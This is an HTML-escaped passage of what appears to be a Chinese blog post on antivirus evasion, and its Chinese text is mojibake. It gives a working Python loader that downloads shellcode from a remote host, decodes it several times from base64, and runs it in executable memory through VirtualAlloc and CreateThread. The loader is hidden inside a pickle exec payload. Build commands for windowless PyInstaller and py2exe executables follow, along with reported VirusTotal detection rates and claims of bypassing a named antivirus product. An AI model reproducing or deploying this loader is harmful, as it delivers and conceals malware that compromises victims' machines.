&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ret_base64&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># åŠ è½½&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ret_base64&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="æ‰“åŒ…exe">æ‰“åŒ…exe&lt;/h4>
&lt;p>ç”Ÿæˆpickle payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">urllib.request&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">codecs&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">_shellcode = urllib.request.urlopen(&amp;#39;http://192.168.31.29/pay1&amp;#39;).read()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">_shellcode = base64.b64decode(_shellcode)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">_shellcode = base64.b64decode(_shellcode)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">_shellcode = base64.b64decode(_shellcode)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">_shellcode = codecs.escape_decode(_shellcode)[0]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">_shellcode = bytearray(_shellcode)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(_shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">buf = (ctypes.c_char * len(_shellcode)).from_buffer(_shellcode)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">ctypes.windll.kernel32.RtlMoveMemory(
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> ctypes.c_uint64(ptr),
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> buf,
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> ctypes.c_int(len(_shellcode))
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">handle = ctypes.windll.kernel32.CreateThread(
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> ctypes.c_int(0),
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> ctypes.c_int(0),
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> ctypes.c_uint64(ptr),
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> ctypes.c_int(0),
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> ctypes.c_int(0),
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> ctypes.pointer(ctypes.c_int(0))
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">object&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">__reduce__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">exec&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#111">,))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ret&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">A&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ret_base64&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ret&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ret_base64&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¢«pyinstalleræˆ–py2exeæ‰“åŒ…çš„éƒ¨åˆ† pack1.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">urllib.request&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">codecs&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ret_base64&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ret_base64&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>PyInstaller&lt;/li>
&lt;/ul>
&lt;p>æ‰“åŒ…çš„æ›´å¤šå‚æ•°å‚è§&lt;a href="https://pyinstaller.org/en/stable/usage.html">doc: Using PyInstaller&lt;/a>ï¼Œç”Ÿæˆexeåœ¨distæ–‡ä»¶å¤¹ä¸­&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>pip3 install pyinstaller
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pyinstaller --noconsole --onefile pack1.py -n demo1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># --noconsole æ— é»‘æ¡†&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># --onefile å•ä¸€æ–‡ä»¶&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># -i æŒ‡å®šfavicon&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># -n ç”Ÿæˆexeåå­—&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å°±ä»¥è¿™æ ·æœ€ç®€å•çš„æ–¹å¼åˆ¶ä½œçš„åŠ è½½å™¨çš„æŸ¥æ€æƒ…å†µæ˜¯&lt;a href="https://www.virustotal.com/gui/file/56420390689318d252b5aab886cb7aad52ee919e99896598306ed938dfc3cdf1">22/66&lt;/a>ï¼Œå¯ä»¥ç›´æ¥è¿‡ç«ç»’&lt;/p>
&lt;ul>
&lt;li>py2exeï¼ˆ*äº²æµ‹ ç”Ÿæˆçš„exeæ–‡ä»¶å¤§å°å°äºPyInstaller ä½†ä¸€å®šæ¦‚ç‡æ— æ³•æ‰§è¡Œ ï¼‰&lt;/li>
&lt;/ul>
&lt;p>ä¸­é—´åª’ä»‹pack2.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">distutils.core&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">setup&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">py2exe&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">setup&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">options&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;py2exe&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;optimize&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e"># ä¼˜åŒ–çº§åˆ«æœ€é«˜ï¼Œ&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;bundle_files&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e"># å°†ç”Ÿæˆçš„è°ƒç”¨æ–‡ä»¶æ‰“åŒ…è¿›exeæ–‡ä»¶&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;compressed&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e"># å‹ç¼©&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">windows&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[{&lt;/span>&lt;span style="color:#d88200">&amp;#34;script&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;pack1.py&amp;#34;&lt;/span>&lt;span style="color:#111">}],&lt;/span> &lt;span style="color:#75715e">#éœ€è¦æ‰“åŒ…çš„ç¨‹åºçš„æ–‡ä»¶è·¯å¾„ï¼Œwindows-&amp;gt;GUI exeçš„è„šæœ¬åˆ—è¡¨,console-&amp;gt; æ§åˆ¶å°exeçš„è„šæœ¬åˆ—è¡¨&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">zipfile&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">None&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e"># ä¸ç”Ÿæˆlibrary.zipæ–‡ä»¶ï¼Œåˆ™æ†ç»‘åœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸­&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>pip3 install py2exe
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>python pack2.py py2exe
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æŸ¥æ€æƒ…å†µ&lt;a href="https://www.virustotal.com/gui/file/87c4fc12bd71bd1fce694393a6f6cab8a1b18424ef6d2d2d6ad062a65ab83bca">14/69&lt;/a>ï¼Œå¯è¿‡ç«ç»’&lt;/p>
&lt;hr>
&lt;p>ä¸€å¼€å§‹å°±æ˜¯åšé¶åœºçš„æ—¶å€™ä¸€æ—¶å…´èµ·çœ‹çœ‹å…æ€ï¼Œåæ¥å‘ç°é‡Œé¢é—¨é“è¿˜æŒºå¤šçš„ï¼ˆæˆ‘æ˜¯åœŸç‹—ï¼‰ï¼Œä¼°è®¡ä»¥åæœ‰ç©ºè¿˜ä¼šè®¤çœŸå­¦&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
ä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æ¥ğŸ”— æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://haiderm.com/undetectable-backdooring-pe-file/">Undetectable backdooring PE file&lt;/a> | &lt;a href="https://scareing.github.io/2019/12/27/%E6%89%8B%E5%B7%A5shellcode%E6%B3%A8%E5%85%A5/">æ‰‹å·¥shellcodeæ³¨å…¥&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.secpulse.com/archives/132175.html">æ¶æ„ç¨‹åºç¼–å†™ä¹‹å…æ€åŸºç¡€&lt;/a> | &lt;a href="https://shu1l.github.io/2021/08/17/mian-sha-xue-xi-shellcode-jia-zai-mian-sha/">å…æ€å­¦ä¹ &amp;ndash;shellcodeåŠ è½½å…æ€&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://webcache.googleusercontent.com/search?q=cache:oZ7CzvkDPFsJ:https://pukrr.github.io/2020/02/25/%25E5%2587%25A0%25E7%25A7%258D%25E5%258A%25A0%25E8%25BD%25BDshellcode%25E7%259A%2584%25E6%2596%25B9%25E6%25B3%2595/+&amp;amp;cd=4&amp;amp;hl=zh-CN&amp;amp;ct=clnk">å‡ ç§åŠ è½½shellcodeçš„æ–¹æ³•&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/Ne0nd0g/go-shellcode">go-shellcode&lt;/a> | &lt;a href="https://github.com/safe6Sec/GolangBypassAV">GolangBypassAV&lt;/a> | &lt;a href="https://github.com/pureqh/bypassAV">bypassAV&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.nday.top/2020/12/07/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/">Python ShellcodeåŠ è½½å™¨ç»•è¿‡AV&lt;/a>&lt;/p>
&lt;/details></description></item></channel></rss>